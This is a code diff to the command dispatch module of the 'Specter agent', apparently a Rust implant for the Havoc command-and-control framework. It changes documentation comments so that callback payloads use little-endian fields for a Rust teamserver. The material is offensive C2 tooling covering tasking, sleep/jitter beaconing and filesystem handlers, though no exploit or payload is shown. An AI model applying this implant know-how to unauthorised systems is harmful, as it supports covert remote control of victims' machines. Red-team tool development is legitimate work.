@@ -1,15 +1,21 @@
 //! Command dispatch and handler implementations for the Specter agent.
 //!
 //! Routes incoming server task packages to platform-native handler functions and
-//! assembles the big-endian response payloads expected by the Havoc teamserver.
+//! assembles the response payloads consumed by the Rust teamserver.
 //!
 //! # Wire endianness
 //!
 //! * **Server → agent** (incoming task payload): integers are **little-endian**
 //!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
-//! * **Agent → server** (outgoing response payload): integers are **big-endian**
-//!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
-//!   teamserver's big-endian `parser.NewParser`).
+//! * **Agent → server** (outgoing response payload — outer envelope)**:
+//!   `command_id`, `request_id`, and the encrypted `payload_len` prefix are
+//!   **big-endian** per the Demon wire protocol (consumed by `parse_callback_packages`).
+//! * **Agent → server** (outgoing response payload — inner content)**:
+//!   All callback payload *fields* (process entries, sleep values, FS paths, …)
+//!   are **little-endian** so they are compatible with the Rust teamserver's
+//!   `CallbackParser::read_u32` / `read_utf16` methods.  Only the FS download
+//!   OPEN/chunk headers retain big-endian encoding to match the legacy Demon
+//!   `PackageAdd*` wire format used by the download subsystem.
 
 use std::collections::HashMap;
 use std::process::{Command as SysCommand, Stdio};
@@ -172,7 +178,7 @@ pub fn dispatch(
 /// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
 ///
 /// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
-/// Outgoing payload (BE): `[delay_ms: u32][jitter_pct: u32]`
+/// Outgoing payload (LE): `[delay_ms: u32][jitter_pct: u32]`
 fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
     let mut offset = 0;
 
@@ -305,7 +311,7 @@ fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 /// [starts: bytes][contains: bytes][ends: bytes]
 /// ```
 ///
-/// Outgoing payload (BE):
+/// Outgoing payload (LE):
 /// ```text
 /// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
 /// per dir group:
